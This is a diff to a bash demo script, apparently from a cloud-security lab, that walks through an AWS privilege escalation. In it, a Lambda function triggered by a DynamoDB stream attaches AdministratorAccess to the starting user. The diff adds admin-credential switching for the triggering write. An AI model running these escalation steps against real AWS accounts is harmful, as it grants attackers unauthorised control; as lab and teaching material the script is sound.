@@ -50,6 +50,13 @@ use_readonly_creds() {
     unset AWS_SESSION_TOKEN
 }
 
+use_admin_creds() {
+    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+    export AWS_REGION="$AWS_REGION"
+    unset AWS_SESSION_TOKEN
+}
+
 # Source demo permissions library for validation restriction
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"
@@ -98,6 +105,10 @@ if [ -z "$READONLY_ACCESS_KEY" ]; then
     echo -e "${YELLOW}Warning: Could not retrieve readonly credentials from Terraform${NC}"
     echo -e "${YELLOW}Policy verification may not work properly${NC}"
 fi
+
+# Get admin credentials for simulating legitimate DynamoDB stream activity
+ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
+ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
 
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
@@ -152,9 +163,10 @@ echo ""
 
 # Step 5: Get DynamoDB stream ARN
 echo -e "${YELLOW}Step 5: Getting DynamoDB stream ARN${NC}"
+use_readonly_creds
 echo "Describing DynamoDB table: $DYNAMODB_TABLE"
 
-show_cmd "Attacker" "aws dynamodb describe-table --region $AWS_REGION --table-name $DYNAMODB_TABLE --query 'Table.LatestStreamArn' --output text"
+show_cmd "ReadOnly" "aws dynamodb describe-table --region $AWS_REGION --table-name $DYNAMODB_TABLE --query 'Table.LatestStreamArn' --output text"
 DYNAMODB_STREAM_ARN=$(aws dynamodb describe-table \
     --region $AWS_REGION \
     --table-name $DYNAMODB_TABLE \
@@ -171,6 +183,7 @@ echo -e "${GREEN}✓ Retrieved DynamoDB stream ARN${NC}\n"
 
 # Step 6: Prepare Lambda function payload
 echo -e "${YELLOW}Step 6: Preparing Lambda function to grant admin access${NC}"
+use_starting_user_creds
 echo "Creating Python function that will attach AdministratorAccess to our user..."
 
 # Create Lambda function code
@@ -329,8 +342,15 @@ while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
     ATTEMPT=$((ATTEMPT + 1))
     echo -e "${BLUE}Attempt $ATTEMPT/$MAX_ATTEMPTS: Inserting DynamoDB record...${NC}"
 
-    # Switch to attacker credentials to insert record
-    use_starting_user_creds
+    # Use admin credentials to insert the trigger record, simulating legitimate
+    # application activity on the DynamoDB table. The starting user has
+    # dynamodb:PutItem as a helpful permission and would use it in a real attack,
+    # but helpful permissions are restricted during demo validation runs.
+    use_admin_creds
+    if [ $ATTEMPT -eq 1 ]; then
+        echo "  [Switching to app/admin identity to simulate a legitimate DynamoDB write that triggers the stream]"
+        show_cmd "Admin (simulating app write)" "aws dynamodb put-item --region $AWS_REGION --table-name \"$DYNAMODB_TABLE\" --item '{\"id\":{\"S\":\"test-trigger-<timestamp>\"},\"message\":{\"S\":\"...\"}}'  (repeated each attempt)"
+    fi
 
     # Insert a new record
     aws dynamodb put-item \
@@ -353,6 +373,9 @@ while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
 
     # Switch to readonly credentials to check policy attachment
     use_readonly_creds
+    if [ $ATTEMPT -eq 1 ]; then
+        echo "  [Switching to readonly identity to observe IAM policy state]"
+    fi
 
     # Check if AdministratorAccess was attached
     ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name "$STARTING_USER" --output json 2>/dev/null)
